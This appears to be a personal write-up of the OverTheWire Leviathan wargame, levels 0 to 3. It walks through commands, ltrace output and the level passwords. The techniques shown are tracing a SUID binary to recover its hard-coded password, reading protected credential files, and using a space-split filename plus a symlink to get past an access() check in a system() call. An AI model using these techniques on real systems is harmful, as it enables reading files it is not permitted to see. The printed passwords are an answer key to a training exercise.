# Leviathan Wargame

This repository documents my progress through the Leviathan wargame from OverTheWire. Leviathan is focused on Linux privilege escalation and basic binary exploitation concepts. It builds on foundational command-line knowledge and introduces challenges involving SUID binaries, input manipulation, and simple logic flaws.

Each level involves escalating access from one user to another, simulating real-world scenarios often seen in penetration tests. I’ll be detailing how I solved each level, the commands and tools I used, and the key concepts I learned. Some levels were completed with the help of community hints or public write-ups, but I made sure to try by myself, understand and explain each solution in my own words.

## Level 0 → 1
```bash
ls -la
cd .backup
ls -la
cat bookmarks.html
grep bookmarks.html 'pass'
```
As we log in, we notice a hidden directory called `.backup`. Inside, there is a file `bookmarks.html`, which includes notes as an `HTML` format. We check if the next password is there using `grep`, and it actually is.

Password: `3QJ3TgzHDq`

## Level 1 → 2
```bash
ls -la
./check
cat check
```
There is a binary file called `check` in the home directory. When being executed, it asks for a password, and it is not the same password as `Leviathan1`. By printing `check` we can see it starts with `ELF`, which is a common format for binary executables. 

### ELF Files
`ELF` is a common file format for executables, object code, shared libraries, and core dumps in Unix-based systems. `ELF` files have a structure that contains the following sections, we will discuss some of them in more depth later on.
* `ELF Header` - each `ELF` file starts with a header that contains data about the file. 
* `Program Header Table` - This section tells the system how to create the process image.
* `.text` - contains the program's executable instructions.
* `.rodata` - contains read only data.
* `.data` - stores initialized global and static variables, data that can be read or write.
* `Section Header Table` - allows to locate all of the file sections, such as `.text` and `.data`. 
There might be more sections, such as `.comment`, which is for comments, and `.debug` for debugging information. 

The `readelf` command is a useful tool that allows to view detailed information about ELF files.
for example, if we use `readelf -h`, we can see a human-readable details from the `ELF Header`.

```bash
readelf -S check
readelf -x .rodata check
readelf -x .data check
strings check
```
The `readelf -S` command shows us the sections of an `ELF` file. We see there some interesting sections that might show the password. Using `readelf -x` we can see the `hex dump` of a specific section, this time we tried `.data` and `.rodata`, that might include the password, but it wasn't there. The `strings` command parses and shows all the strings in a binary file, but looking at the strings, nothing seems like the password.

```bash
ltrace check
```
the `ltrace` command shows what libraries are called during a program execution. So after using `ltrace` on our executable, it asks for the password. When given the wrong one, we can see very useful info:
```bash
__libc_start_main(0x80490ed, 1, 0xffffd494, 0 <unfinished ...>
printf("password: ")                                              = 10
getchar(0, 0, 0x786573, 0x646f67password: 123
)                                 = 49
getchar(0, 49, 0x786573, 0x646f67)                                = 50
getchar(0, 0x3231, 0x786573, 0x646f67)                            = 51
strcmp("123", "sex")                                              = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                              = 29
+++ exited (status 0) +++
```
The line we are interested in is `strcmp("123", "sex")`. We tried the password `123`, and the program called `strcmp`, which is a function to compare strings, on `123` and `sex`. What probably happened here, is that the program compared the input to the actually password, which is `sex`.

```bash
./check
sex
```
This is the right password. By cracking the password of this executable, it opens a shell that is being executed with `Leviathan2` permissions.
```bash
$ whoami
leviathan2
$ cat /etc/leviathan\_pass/leviathan2
NsN1HwFoyN
```
By using `Leviathan2` permissions, we can access it's password in `/etc/leviathan_pass/`.

Password: `NsN1HwFoyN`

## Level 2 → 3
```bash
ls -la
./printfile
./printfile /etc/leviathan_pass/leviathan3
./printfile /etc/leviathan_pass/leviathan2
```
We log in and notice the file `printfile`. When executed, it prints:
```bash
*** File Printer ***
Usage: ./printfile filename
```
But when trying to print the password of `Leviathan3` it says:
```bash
You cant have that file...
```
But, when we try to print the password for `Leviathan2` it gives a `Permission denied` error, which means that it probably has permissions to print the poassword of `Leviathan3`, so it must have the user's permissions.
```bash
ltrace ./printfile /etc/leviathan_pass/leviathan3
ltrace ./printfile .bash_logout
```
As we trace the function calls, the first one, that contains the password, only uses `access` command which checks if it has permissions to the given file. On the second try, with a file that actually getting printed we get:
```bash
__libc_start_main(0x80490ed, 2, 0xffffd474, 0 <unfinished ...>
access(".bash_logout", 4)                                         = 0
snprintf("/bin/cat .bash_logout", 511, "/bin/cat %s", ".bash_logout") = 21
geteuid()                                                         = 12002
geteuid()                                                         = 12002
setreuid(12002, 12002)                                            = 0
system("/bin/cat .bash_logout"# ~/.bash_logout: executed by bash(1) when login shell exits.

# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                            = 0
+++ exited (status 0) +++
```
We can see that `/bin/cat` is being used, which can be useful.

```bash
mktemp -d
touch /tmp/tmp.pb8pbUsODK/file\ with\ spaces
ltrace ./printfile /tmp/tmp.pb8pbUsODK/file\ with\ spaces
```
We create a file with spaces in its name, and try to use `printfile` to print it. We trace the execution and get this:
```bash
__libc_start_main(0x80490ed, 2, 0xffffd454, 0 <unfinished ...>
access("/tmp/tmp.pb8pbUsODK/file with sp"..., 4)                  = 0
snprintf("/bin/cat /tmp/tmp.pb8pbUsODK/fil"..., 511, "/bin/cat %s", "/tmp/tmp.pb8pbUsODK/file with sp"...) = 45
geteuid()                                                         = 12002
geteuid()                                                         = 12002
setreuid(12002, 12002)                                            = 0
system("/bin/cat /tmp/tmp.pb8pbUsODK/fil".../bin/cat: /tmp/tmp.pb8pbUsODK/file: No such file or directory
/bin/cat: with: No such file or directory
/bin/cat: spaces: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                            = 256
+++ exited (status 0) +++
```
We can see that `access` tests `file with spaces`, but `cat` was called for every word separately. So it bypasses `access` and then it tries to print `/tmp/tmp.pb8pbUsODK/file`.

### Symbolic Links
A `symbolic link`, or a `soft link`, is a type of file that points to another file or directory. It is mainly used as a shortcut for files and directories, as it allows to access a file or directory from a different location without creating a copy of it. There is also another type of links, they're called `hard links` and they make files with the same `inode`, which is like having different names for the same file.

The `ln` command is a tool for creating links between files. By default it makes hard links, by adding the `-s` flag it can also make soft links.

```bash
ln -s /etc/leviathan_pass/leviathan3 /tmp/tmp.pb8pbUsODK/file
chmod 777 /tmp/tmp.pb8pbUsODK
./printfile /tmp/tmp.pb8pbUsODK/file\ with\ spaces
```
We made a soft link to the file with the password of `Leviathan3` and called it `/tmp/tmp.pb8pbUsODK/file`. As we seen before, `access` tests the permission of the original file in the input `/tmp/tmp.pb8pbUsODK/file with spaces`, but `cat` is executed on every word separately, so it runs `cat /tmp/tmp.pb8pbUsODK/file`, and because it links to the password file, the password is being printed.

Password: `f0n8h2iWLP`
